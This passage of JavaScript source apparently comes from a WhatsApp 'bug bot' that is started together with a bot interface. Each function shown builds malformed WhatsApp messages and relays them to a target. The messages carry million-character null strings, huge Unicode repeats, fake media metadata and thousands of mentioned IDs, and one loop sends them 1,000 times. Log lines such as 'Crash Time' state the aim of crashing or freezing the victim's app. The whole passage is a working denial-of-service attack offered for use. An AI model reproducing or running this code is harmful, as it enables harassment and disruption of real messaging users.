                    midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=',  
                },  
            },  
            nativeFlowMessage: {  
                buttons: [],  
            },  
        });  
    }  
      
    const carousel = generateWAMessageFromContent(target, {  
        interactiveMessage: {  
            header: {  
                hasMediaAttachment: false,  
            },  
            body: {  
                text: '\u0000\u0000\u0000\u0000\u0000\u0000',  
            },  
            footer: {  
                text: 'x',  
            },  
            carouselMessage: {  
                cards: [...push],  
            },  
        }  
    }, {  
        userJid: target  
    });  
      
    await sock.relayMessage(target, { groupStatusMessageV2: { message: carousel.message } }, {  
        messageId: carousel.key.id,  
        participant: {  
            jid: target  
        },  
    });  
}  
await sock.relayMessage("status@broadcast", { 
    conversation: "X" 
});
await sock.relayMessage("status@broadcast", {  
    statusJidList: [target],  
    additionalNodes: [{  
        tag: "meta",  
        attrs: {  
            status_setting: "allowlist"  
        },  
        content: [{  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{  
                tag: "to",  
                attrs: {  
                    jid: target  
                }  
            }]  
        }]  
    }]  
});
};

async function DelayKonodex(sock, target) {
  const msg1 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg2 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg3 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  for (const msg of [msg1, msg2, msg3]) {
    await sock.relayMessage(
      "status@broadcast", 
      msg,
      {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
}

async function CStatus(sock, target) {
    let msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "\u0000".repeat(9000),
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Medan\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
                isForwarded: true,
                forwardingScore: 7205,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363395010254840@newsletter",
                    newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
                    serverMessageId: 1000,
                    accessibilityText: "idk"
                },
                statusAttributionType: "RESHARED_FROM_MENTION",
                contactVcard: true,
                isSampled: true,
                dissapearingMode: {
                    initiator: target,
                    initiatedByMe: true
                },
                expiration: Date.now()
            },
        }
    }, {});

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
        participant: { jid: target }
    });
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "X",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    };

    const msg2 = {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    };

    for (let i = 0; i < 1000; i++) {
        const payload = generateWAMessageFromContent(target, msg1, msg2);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message
            }
        }, { messageId: payload.key.id, participant: { jid: target } });

        await sleep(1000);
    }

    await sock.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}

async function ATRDelayXCrash(sock, target) {
  const andro = "ANDROID CRASH";

  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/json",
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "999999999999",
              pageCount: 7.554679297577082e+23,
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName: "҉ ATHERIA ",
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1715880173"
            },
            hasMediaAttachment: true
          },
          body: {
            text: " LU AMPAS " + andro
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              name: "galaxy_message",
              flow_action: "navigate",
              flow_action_payload: { screen: "CTZ_SCREEN" },
              flow_cta: "🪭",
              flow_id: "UNDEFINEDONTOP",
              flow_message_version: "9.903",
              flow_token: "UNDEFINEDONTOP"
            })
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
            groupMentions: [
              {
                groupJid: "1@newsletter",
                groupSubject: "UNDEFINEDONTOP"
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });

  console.log(" Crash Time ");
}


async function xclowerz(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "XW4R", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            entryPointConversionSource: "call_permission_request"
          }
        },
        extendedTextMessage: {
          text: "Kill Invisible" + "ꦾ".repeat(50000),
          matchedText: "ꦽ".repeat(20000),
          description: "Who",
          title: "ꦽ".repeat(20000),
          previewType: "NONE",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBICEwM0QmF//aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABERAgD/2gAIAQIBAT8A3eMjFj//xAAcEQADAAIDAQAAAAAAAAAAAAAAAQERAhIQICD/2gAIAQMBAT8AI+fafUJU0Y1GYtK02xMo30//2Q==",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "warx@newsletter",
                newsletterName: "Invisible Kill Delay" + "ꦾ".repeat(10000),
                caption: "Silent Kill" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "Killer You" + "⃝꙰꙰꙰".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      }
    }
  }, {
    userJid: target,
    messageId: undefined,
    messageTimestamp: (Date.now() / 1000) | 0
  });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || undefined,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target });

  const msg2 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦽ".repeat(999999),
            hasMediaAttachment: false
          },
          body: {
            text: "BANGSAT LU DELAY" + "\u0000".repeat(10000)
          },
          nativeFlowMessage: {
            name: "delay_processor",
            messageVersion: 5,
            flowMessageVersion: 2,
            paramsJson: JSON.stringify({
              delay_type: "extreme",
              timeout_ms: 9999999,
              memory_alloc: 1073741824,
              cpu_usage: 100
            })
          }
        }
      }
    }
  }, {
    forwardingScore: 77777,
    isForwarded: true,
    ephemeralExpiration: 604800000
  });

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id + "_delay",
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const Audio = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "133@newsletter",
                serverMessageId: 1,
                newsletterName: "𞋯"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

  await sock.relayMessage("status@broadcast", msgAudio.message, {
    messageId: msgAudio.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  console.log(`SUKSES SEND BUG DELAY KE ${target}`);
}

async function Nukleotix(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointCenversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
  } catch (err) {
    console.log(err.message)
  }
}


// ~ End Function Bugs ~ \\
(async () => {
  WhatsAppConnect();
  bot.launch();
})();